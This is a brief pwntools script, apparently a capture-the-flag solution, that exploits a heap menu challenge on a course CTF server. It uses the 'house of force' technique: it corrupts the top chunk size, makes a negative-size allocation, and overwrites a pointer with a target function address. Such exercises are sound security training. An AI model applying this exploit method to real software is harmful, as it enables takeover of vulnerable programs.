#!/usr/bin/env python
# -*- coding: utf-8 -*-
### Use house of force on the example
from pwn import *
host = 'csie.ctf.tw'
port = 10138
r = remote(host, port)
magic = 0x0000000000400d49

def show():
    r.recvuntil(":")
    r.sendline("1")

def add_item(size, name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)

def change(idx, size, name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(name)

def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

add_item(0x20, 'Bang')
change(0, 0x31, "a"*0x20 + p64(0) + p64(0xffffffffffffffff))
add_item(-96, "aaaa")
add_item(0x11, p64(magic)*2)
r.interactive()
